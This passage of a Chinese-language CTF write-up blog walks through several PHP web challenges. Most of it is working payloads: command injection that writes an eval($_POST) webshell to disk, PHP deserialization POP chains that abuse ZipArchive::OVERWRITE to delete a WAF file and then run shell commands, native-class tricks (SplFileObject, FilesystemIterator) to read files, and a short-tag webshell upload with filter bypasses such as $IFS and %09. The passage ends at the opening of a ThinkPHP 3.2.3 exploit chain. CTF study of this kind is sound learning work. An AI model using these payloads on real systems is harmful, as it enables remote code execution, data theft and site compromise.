<pre><code class="language-demo" data-lang="demo">?nep=`$_GET[a]`;1&amp;len=-1&amp;a=echo &quot;&lt;?php eval(\$_POST[theoyu]);&quot;&gt;theoyu.php
</code></pre><h4 id="solution4">solution4</h4>
<p>这个是看一位老哥的wp时发现的，确实巧妙。
首先鉴于php的弱类型，<code>intval</code>会把字符串数字后给截断，导致比如<code>7;agawg</code>识别为7，然后里用?nep=<code>$len</code>达到内联执行的效果。</p>
<pre><code class="language-demo" data-lang="demo">?nep=`$len`;&amp;len=7;echo &quot;&lt;?php @eval(\$_POST[theoyu])?&gt;&quot; &gt; theoyu.php
</code></pre><h3 id="梦里花开牡丹亭">梦里花开牡丹亭</h3>
<blockquote>
<p>考察php原生类的利用</p>
</blockquote>
<p>源码：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">include</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">);</span>
<span class="k">class</span> <span class="nc">Game</span><span class="p">{</span>
    <span class="k">public</span>  <span class="nv">$username</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$password</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$choice</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$register</span><span class="p">;</span>

    <span class="k">public</span>  <span class="nv">$file</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$filename</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$content</span><span class="p">;</span>
    
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">=</span><span class="s1">&#39;user&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=</span><span class="s1">&#39;user&#39;</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">register</span><span class="p">)</span><span class="o">===</span><span class="s2">&#34;21232f297a57a5a743894a0e4a801fc3&#34;</span><span class="p">){</span>    
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">choice</span><span class="o">=</span><span class="k">new</span> <span class="nx">login</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">choice</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">register</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">choice</span><span class="o">-&gt;</span><span class="na">checking</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">}</span>
<span class="k">class</span> <span class="nc">login</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$filename</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$filename</span><span class="p">,</span><span class="nv">$content</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="nv">$file</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="o">=</span><span class="nv">$filename</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="o">=</span><span class="nv">$content</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">checking</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$username</span><span class="o">===</span><span class="s1">&#39;admin&#39;</span><span class="o">&amp;&amp;</span><span class="nv">$password</span><span class="o">===</span><span class="s1">&#39;admin&#39;</span><span class="p">){</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;login success you can to open shell file!&#39;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">register</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">checking</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$username</span><span class="o">===</span><span class="s1">&#39;admin&#39;</span><span class="o">&amp;&amp;</span><span class="nv">$password</span><span class="o">===</span><span class="s1">&#39;admin&#39;</span><span class="p">){</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;success register admin&#39;</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;please register admin &#39;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">Open</span><span class="p">{</span>
    <span class="k">function</span> <span class="nf">open</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$content</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;waf.txt&#39;</span><span class="p">)){</span>    
            <span class="nx">shell</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">);</span>    
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span><span class="o">!==</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span><span class="o">===</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]))){</span>
    <span class="o">@</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;unser&#39;</span><span class="p">]));</span>
<span class="p">}</span>
</code></pre></div><p>第一步当然是利用<code>open</code>函数去读一下<code>shell.php</code>,注意php文件内容的读取都需要用伪协议。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">Game</span>
<span class="p">{</span>
    <span class="k">public</span>  <span class="nv">$username</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$password</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$choice</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$register</span><span class="p">;</span>

    <span class="k">public</span>  <span class="nv">$file</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$filename</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$content</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>   
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">register</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="k">new</span> <span class="nx">Open</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="o">=</span><span class="s1">&#39;php://filter/read=convert.base64-encode/resource=shell&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Open</span>
<span class="p">{</span>

<span class="p">}</span>
    <span class="nv">$demo</span><span class="o">=</span><span class="k">new</span> <span class="nx">Game</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$demo</span><span class="p">))</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>a和b的绕过用数组即可。
拿到shell.php</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">function</span> <span class="nf">shell</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">){</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#39;</span><span class="p">,</span><span class="nv">$cmd</span><span class="p">)){</span>
            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;NO&#34;</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">return</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;so long!&#39;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>重新回到index.php，发现要想命令执行，需要把当前目录下的<code>waf.txt</code>给删除才行，<code>index.php</code>中可以利用的点不多，我们遍历一下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$classes</span> <span class="o">=</span> <span class="nx">get_declared_classes</span><span class="p">();</span>
<span class="k">foreach</span> <span class="p">(</span><span class="nv">$classes</span> <span class="k">as</span> <span class="nv">$class</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$methods</span> <span class="o">=</span> <span class="nx">get_class_methods</span><span class="p">(</span><span class="nv">$class</span><span class="p">);</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$methods</span> <span class="k">as</span> <span class="nv">$method</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
            <span class="s1">&#39;__destruct&#39;</span><span class="p">,</span>
            <span class="s1">&#39;__wakeup&#39;</span><span class="p">,</span>
            <span class="s1">&#39;open&#39;</span><span class="p">,</span>
        <span class="p">)))</span> <span class="p">{</span>
            <span class="k">print</span> <span class="nv">$class</span> <span class="o">.</span> <span class="s1">&#39;::&#39;</span> <span class="o">.</span> <span class="nv">$method</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>其中<code>ZipArchive::open</code>,如果指定参数为<code>ZIPARCHIVE::OVERWRITE</code>,则会对源文件进行重覆盖，</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520000222964.png" alt="image-20210520000222964"></p>
<p>同时我们关注红框里的一句话，如果文件为空则无效，我们就可以利用这个删除<code>waf.txt</code>。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">Game</span>
<span class="p">{</span>
    <span class="k">public</span>  <span class="nv">$username</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$password</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$choice</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$register</span><span class="p">;</span>

    <span class="k">public</span>  <span class="nv">$file</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$filename</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$content</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>   
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">register</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="o">=</span><span class="s1">&#39;waf.txt&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="o">=</span><span class="nx">ZipArchive</span><span class="o">::</span><span class="na">OVERWRITE</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Open</span>
<span class="p">{</span>

<span class="p">}</span>
    <span class="nv">$demo</span><span class="o">=</span><span class="k">new</span> <span class="nx">Game</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$demo</span><span class="p">))</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>之后就是命令执行，这个绕过的条件太宽裕了，就不说了。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">Game</span>
<span class="p">{</span>
    <span class="k">public</span>  <span class="nv">$username</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$password</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$choice</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$register</span><span class="p">;</span>

    <span class="k">public</span>  <span class="nv">$file</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$filename</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$content</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>   
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">register</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="k">new</span> <span class="nx">Open</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="o">=</span><span class="s1">&#39;ls /&#39;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Open</span>
<span class="p">{</span>

<span class="p">}</span>
    <span class="nv">$demo</span><span class="o">=</span><span class="k">new</span> <span class="nx">Game</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$demo</span><span class="p">))</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><h2 id="0x02-mar-dasctf">0x02 MAR DASCTF</h2>
<p>平台真是卡的要命，注入题一个都跑不动。</p>
<h3 id="ez_serialize">ez_serialize</h3>
<p>源码：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>

<span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$class</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$para</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$check</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span> <span class="o">=</span> <span class="s2">&#34;B&#34;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">para</span> <span class="o">=</span> <span class="s2">&#34;ctfer&#34;</span><span class="p">;</span>
        <span class="k">echo</span> <span class="k">new</span>  <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">para</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>   
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">check</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">C</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">check</span><span class="o">-&gt;</span><span class="na">vaild</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">para</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">check</span><span class="o">-&gt;</span><span class="na">vaild</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="k">new</span>  <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">para</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;bad hacker~&#39;</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">}</span>
<span class="k">class</span> <span class="nc">B</span><span class="p">{</span>
    <span class="k">var</span> <span class="nv">$a</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
        <span class="k">echo</span> <span class="p">(</span><span class="s2">&#34;hello &#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">C</span><span class="p">{</span>

    <span class="k">function</span> <span class="nf">vaild</span><span class="p">(</span><span class="nv">$code</span><span class="p">){</span>
        <span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">&#39;/[!|@|#|$|%|^|&amp;|*|=|\&#39;|&#34;|:|;|?]/i&#39;</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span>
            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">])){</span>
    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">]);</span>
<span class="p">}</span>
<span class="k">else</span><span class="p">{</span>
    <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div><p>感觉就是利用原生类去读取文件了，在<a href="https://www.php.net/manual/zh/book.spl.php" title="手册">手册</a>以下几个类需要注意：</p>
<table>
<thead>
<tr>
<th>DirectoryIterator</th>
<th>遍历目录</th>
</tr>
</thead>
<tbody>
<tr>
<td>FilesystemIterator</td>
<td>遍历目录</td>
</tr>
<tr>
<td>SplFileObject</td>
<td>读取文件，按行读取，多行需要遍历</td>
</tr>
</tbody>
</table>
<p>然后就是读目录，读文件的操作了：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$class</span><span class="o">=</span><span class="s1">&#39;FilesystemIterator&#39;</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$para</span><span class="o">=</span><span class="s2">&#34;/var/www/html&#34;</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$check</span><span class="p">;</span>
    <span class="p">}</span>
<span class="nv">$o</span>  <span class="o">=</span> <span class="k">new</span> <span class="nx">A</span><span class="p">();</span>
<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$class</span><span class="o">=</span><span class="s1">&#39;SplFileObject&#39;</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$para</span><span class="o">=</span><span class="s2">&#34;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&#34;</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$check</span><span class="p">;</span>
    <span class="p">}</span>

<span class="nv">$o</span>  <span class="o">=</span> <span class="k">new</span> <span class="nx">A</span><span class="p">();</span>
<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
</code></pre></div><h2 id="0x03-红明谷">0x03 红明谷</h2>
<h3 id="write_shell">Write_shell</h3>
<p>源码：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$input</span><span class="p">){</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/&#39;| |_|php|;|~|</span><span class="se">\\</span><span class="s2">^|</span><span class="se">\\</span><span class="s2">+|eval|{|}/i&#34;</span><span class="p">,</span><span class="nv">$input</span><span class="p">)){</span>
        <span class="c1">// if(preg_match(&#34;/&#39;| |_|=|php/&#34;,$input)){
</span><span class="c1"></span>        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker!!!&#39;</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="nv">$input</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$input</span><span class="p">){</span>
  <span class="k">if</span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$input</span><span class="p">)){</span>
      <span class="k">foreach</span><span class="p">(</span><span class="nv">$input</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$output</span><span class="p">){</span>
          <span class="nv">$input</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">waf</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span>
      <span class="p">}</span>
  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
      <span class="nv">$input</span> <span class="o">=</span> <span class="nx">check</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$dir</span> <span class="o">=</span> <span class="s1">&#39;sandbox/&#39;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)){</span>
    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">switch</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;action&#34;</span><span class="p">]</span> <span class="o">??</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="s1">&#39;pwd&#39;</span><span class="o">:</span>
        <span class="k">echo</span> <span class="nv">$dir</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="s1">&#39;upload&#39;</span><span class="o">:</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;data&#34;</span><span class="p">]</span> <span class="o">??</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
        <span class="nx">waf</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
        <span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$dir</span><span class="s2">&#34;</span> <span class="o">.</span> <span class="s2">&#34;index.php&#34;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>默认是开启了短标签，那么</p>
<pre><code class="language-demo" data-lang="demo">?action=upload&amp;data=&lt;?=`ls`?&gt;
</code></pre><p>是ok的 因为空格被过滤了，我们需要找到代替空格的地方。
测试以下代替空格都可以：</p>
<pre><code>%09 
\$IFS
\t
</code></pre><p>后面就直接读flag即可。</p>
<h3 id="easytp">Easytp</h3>
<blockquote>
<p>感觉今后还是得审一下框架，不让就只会那别人的exp也没什么意思。</p>
</blockquote>
<p>看到<code>THINK_VERSION =  '3.2.3';</code>，就直接去找链子打了。然后看到了<a href="https://f5.pm/go-53579.html" title="这一篇文章">这一篇文章</a>，改了改选择传马。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">namespace</span> <span class="nx">Think\Db\Driver</span><span class="p">{</span>
